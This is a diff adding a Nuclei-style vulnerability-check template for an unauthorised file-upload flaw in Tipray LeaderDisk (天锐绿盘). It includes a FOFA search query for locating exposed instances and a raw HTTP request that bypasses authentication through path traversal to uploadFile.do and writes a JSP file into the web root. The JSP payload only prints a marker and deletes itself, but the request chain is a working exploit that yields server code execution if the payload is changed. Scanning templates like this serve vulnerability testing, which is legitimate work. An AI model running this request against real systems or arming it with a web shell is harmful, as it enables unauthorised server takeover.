@@ -1,0 +1,39 @@
+id: tianrui-greendisk-uploadfile-upload
+
+info:
+  name: "天锐绿盘 uploadFile 组件文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
+          厦门天锐科技股份有限公司（简称天锐股份）是一家专注于数据安全领域的高新技术企业，成立于2006年，总部位于厦门软件园三期，法定代表人为涂高元。公司以自主研发的“天锐绿盾”系列产品为核心，为政府、军工及企事业单位提供数据安全解决方案，拥有多项国家级资质认证和知识产权。天锐绿盘云文档安全管理平台中的 uploadFile 组件存在非授权文件上传缺陷，攻击者可利用此缺陷实现任意文件上传，进而可能获取服务器控制权限。
+  tags: 天锐绿盘
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /lddsm/main/auth.do/../../admin/activiti/uploadFile.do?taskId=../webapps/ROOT/&name=1.txt HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGTGh0t0j5T3vcezw
+
+    ------WebKitFormBoundaryGTGh0t0j5T3vcezw
+    Content-Disposition: form-data; name="file";filename="NTest.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryGTGh0t0j5T3vcezw--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
